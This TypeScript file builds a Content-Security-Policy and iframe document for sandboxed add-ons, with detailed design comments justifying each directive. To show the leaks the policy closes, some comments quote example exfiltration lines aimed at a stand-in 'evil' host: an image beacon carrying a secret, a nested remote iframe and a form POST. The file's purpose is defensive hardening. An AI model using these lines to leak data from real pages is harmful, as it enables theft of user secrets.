// SPDX-FileCopyrightText: 2026 quissicutdeus
//
// SPDX-License-Identifier: AGPL-3.0-or-later

/**
 * Everything a frame may reach, as one `<meta http-equiv="Content-Security-Policy">`.
 *
 * ## Why this used to be `connect-src` alone, and why that stopped being enough
 *
 * MICA-24 set `connect-src` and deliberately left every other directive unset. Its
 * reasoning is worth restating because it was right at the time: the ticket was about
 * `fetch()` to an arbitrary host, and tightening `script-src`/`style-src` risked breaking
 * Svelte's runtime-injected `<style>` tags and the inlined module script itself, with no
 * browser or game client in reach to verify against.
 *
 * What that reasoning missed is that `connect-src` is not the only way out. An unset
 * `img-src` means `new Image().src = 'http://evil/?' + secret` is an exfiltration channel
 * that needs no response to be useful, and an unset `frame-src` means the guest can nest
 * an `<iframe src="https://evil">`: CSP inherits into a child only for *local* schemes
 * (`about:`, `blob:`, `data:`, `srcdoc`), so a nested remote document gets **no** policy at
 * all — unrestricted `fetch`, and a `postMessage` relay back out through its parent. So
 * `networkHosts` was advisory: a declared allowlist of one origin, with three unpoliced
 * doors beside it.
 *
 * The answer to MICA-24's caution is `default-src 'none'` plus two explicit escape
 * hatches. `script-src` and `style-src` are spelled out at exactly the reach they had when
 * they were unset, so nothing about how an add-on's own code and styles load changes: the
 * concern was real and this does not test it. Everything MICA-24 left open *and did not
 * have a reason to* is shut.
 *
 * ## Directive by directive
 *
 * - `default-src 'none'` — the floor. Anything not named below (`object-src`,
 *   `manifest-src`, `prefetch-src`, `worker-src` via `child-src`) is refused.
 * - `connect-src` — unchanged: `AppManifest.networkHosts`, or `'none'`.
 * - `img-src` / `media-src` / `font-src`: `data: blob:` plus `networkHosts`. So
 *   `networkHosts` means *every* outbound request the frame makes, not only `fetch()`.
 *   Until MICA-202 these were `https: data: blob:` — subresource loads kept the practical
 *   reach they had, on the theory that an add-on renders photos and avatars whose URLs
 *   the phone hands it at runtime from any https origin. The audit behind MICA-202 found
 *   that theory did not describe the phone: everything the media service delivers to an
 *   add-on is a `data:` URI (`server/services/Media.ts`, "the delivery path is a data URI
 *   either way"), avatars are `data:`, and no in-tree add-on names an https image, clip
 *   or face anywhere. The one thing that can put an https URL in front of an add-on is
 *   another resource calling the `AddMedia` export with a hotlinked `url` — and that row
 *   now draws as a broken image inside a `core: false` add-on rather than opening
 *   `new Image().src = 'https://evil/?' + secret` to every add-on on the phone. `data:`
 *   and `blob:` stay because neither leaves the frame, and because a bundler inlines a
 *   small font face as a `data:` URI, which `default-src 'none'` would otherwise refuse.
 *   `'self'` is deliberately not here: the frame is `sandbox="allow-scripts"` with no
 *   `allow-same-origin`, so its origin is opaque and `'self'` matches nothing.
 * - `script-src` / `style-src` — **exactly as before this existed**. Unset with no
 *   `default-src` meant unrestricted; under a `default-src 'none'` floor, "unrestricted"
 *   has to be written out, which is what the scheme list and the two `'unsafe-'` keywords
 *   are. They are not an endorsement — they are the honest spelling of today's behaviour,
 *   and narrowing them is its own ticket with its own in-game verification.
 * - `frame-src 'none'` / `child-src 'none'` — no nested browsing context, which is the
 *   CSP-inheritance hole above. `child-src` is also `worker-src`'s fallback, so this stops
 *   a `Worker`/`SharedWorker` too. That is a real narrowing for an add-on that used one;
 *   it is accepted, because a worker is another script context reached through exactly the
 *   nesting this directive exists to close.
 * - `form-action 'none'` — a form POST is a navigation, and navigations are not governed by
 *   `connect-src`. Without this, `<form action="https://evil" method=post>` walks a payload
 *   straight out.
 * - `base-uri 'none'` — a `<base href>` injected into the guest would silently re-point
 *   every relative URL in the document.
 *
 * Every directive here is CSP Level 2 or earlier apart from `child-src` (also Level 2) and
 * `worker-src`'s fallback behaviour, so all of it is understood by Chromium 103 — the floor
 * AGENTS.md §6 holds this tree to. `navigate-to`, which is what would actually stop the
 * self-navigation described in `IframeHostServer.ts`, is deliberately absent: Chromium
 * never shipped it, in 103 or since, so the host checks the origin of every inbound message
 * and tears the frame down on a second `load` instead.
 *
 * ## What this still does not stop
 *
 * A declared host is a declared host: an add-on whose `networkHosts` names
 * `https://api.example.com` can beacon to it with an `<img>` exactly as it can `fetch()`
 * it, and that is the point — the manifest is the whole statement of where a bundle may
 * send bytes, and a reader no longer has to know that images were the exception. What
 * remains is the sandbox's own self-navigation, which no directive Chromium ships can
 * stop and which the host counts documents to catch (`IframeHostServer.ts`).
 */
function cspFor(networkHosts: readonly string[]): string {
  /**
   * An empty list is `'none'`, not an omitted directive — CSP has no bare "block
   * everything" keyword for one directive alone, and omitting `connect-src` entirely would
   * now inherit `default-src 'none'`, which happens to be the same answer but for a reason
   * a reader would have to go and derive. Say it.
   */
  const connect = networkHosts.length > 0 ? networkHosts.join(' ') : "'none'";
  /**
   * Subresources: the schemes that cannot leave the frame, then the same hosts `fetch()`
   * may reach. Never `'none'`, because `data:` is always in the list — and never `https:`
   * again, which is what MICA-202 closed.
   */
  const loads = ['data:', 'blob:', ...networkHosts].join(' ');
  const policy = [
    "default-src 'none'",
    `connect-src ${connect}`,
    `img-src ${loads}`,
    `media-src ${loads}`,
    `font-src ${loads}`,
    "script-src 'unsafe-inline' 'unsafe-eval' https: http: data: blob:",
    "style-src 'unsafe-inline' https: http: data: blob:",
    "frame-src 'none'",
    "child-src 'none'",
    "form-action 'none'",
    "base-uri 'none'"
  ].join('; ');
  return `<meta http-equiv="Content-Security-Policy" content="${policy}">`;
}

/**
 * The document an add-on runs in. The verified text is inlined directly as a module
 * script rather than wrapped in a `data:` URL — URL-encoding roughly triples a minified
 * bundle's size, which the browser then has to hold, decode and parse on every open.
 *
 * A syntax error in the inlined module fails to parse before `bootAddOn` ever runs, so
 * its own `window.addEventListener('error', ...)` never registers to catch it. The
 * fallback listener below is added first, in a plain (non-module) script, so it is live
 * before the module script is even parsed.
 */
export function srcdocFor(code: string, networkHosts: readonly string[] = []): string {
  const escaped = code.replace(/<\/script/gi, '<\\/script').replace(/<!--/g, '<\\!--');
  return [
    '<!doctype html><html><head><meta charset="utf-8">',
    cspFor(networkHosts),
    '<style>html,body{margin:0;height:100%;background:transparent;overflow:hidden}#app{height:100%}</style>',
    `<script>window.addEventListener('error', (e) => parent.postMessage({ kind: 'error', message: String((e.error && e.error.message) || e.message), stack: e.error instanceof Error ? (e.error.stack ?? null) : null }, '*'));</script>`,
    '</head><body><div id="app"></div>',
    `<script type="module">${escaped}</script>`,
    '</body></html>'
  ].join('');
}
